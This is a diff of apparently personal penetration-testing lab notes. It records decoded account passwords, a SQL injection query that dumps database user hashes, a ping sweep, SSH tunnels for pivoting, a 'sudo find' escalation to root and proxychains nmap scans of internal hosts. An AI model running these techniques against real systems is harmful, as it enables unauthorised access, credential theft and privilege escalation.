@@ -68,11 +68,11 @@ HAM 	32 	$15
 2 	RntyrfVfNER78 	$user2
 3 	Obo4GURRnccyrf 	$user3
 4 	anotherpassword4THEages 	$Lroth
-Found:
+Found: The passwords are Ciphers
 user: Lee_Roth pass: anotherpassword4THEages
-user: Aaron pass: ncnffjbeqlCn$$jbeq
-user: user2 pass: RntyrfVfNER78
-user: user3 pass: Obo4GURRnccyrf
+user: Aaron pass: ncnffjbeqlCn$$jbeq -> apasswordyPa$$word
+user: user2 pass: RntyrfVfNER78 -> EaglesIsARE78
+user: user3 pass: Obo4GURRnccyrf -> Bob4THEEapples
 These gain access to the accounts on .28.45's webpage but not for creating ssh sessions
 
 http://localhost:1111/pick.php?product=7 UNION SELECT Host,User,Password FROM mysql.user;#
@@ -82,9 +82,40 @@ localhost 		                                        $root
 localhost 	*BF207353FF1EAA9EBA7DD87E37E6D278746F17CD 	$webuser
 Found: Nothing
 
-###Stuck because I can't find credentials to ssh into the .28.181 box### A lot of people are stuck on this
+Perform a ping sweep from the user2 ssh shell --> cmd: '/bin/bash' puts you into a proper shell where you can run the ping sweep cmd: for i in {1..254}; do (ping -c1 192.168.28.$i | grep "bytes from" &); done
+ -> this revealed the 192.168.28.172 box
 
+Nmap scan report for 192.168.28.172
+Host is up (0.0014s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
 
+New Tunnel: student@lin-ops:~$ ssh -S /tmp/gray dummy -O forward -L3333:192.168.28.172:22
+ssh session: ssh Aaron@localhost -p3333
+I got in
 
+sudo -l -> can use 'find' without password --> 'sudo find . -exec /bin/sh \; -quit' gives me root access
+ping sweep: for i in {1..254}; do (ping -c1 192.168.28.$i | grep "bytes from" &); done
+	--> This gives me: 64 bytes from 192.168.28.172: icmp_seq=1 ttl=64 time=0.028 ms
+			    64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=2.13 ms *New IP*
+			    64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.880 ms
 
+New Tunnel & SSH Session: 
+ssh -MS /tmp/blue Aaron@localhost -p3333 -> perform 'find' exploit for root access again
+ssh -S /tmp/blue stupid -O forward -D9050
+
+nmap from lin-ops: proxychains nmap -Pn -T4 -sT --min-rate=6546847 192.168.28.179
+Nmap scan report for 192.168.28.179
+Host is up (0.0015s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+9999/tcp open  abyss
+
+copy localhost d1:fe:d0:3d:4d:c9:30:34:41:16:76:6b:d2:5a:ba:ba:d3:02:41:61
 
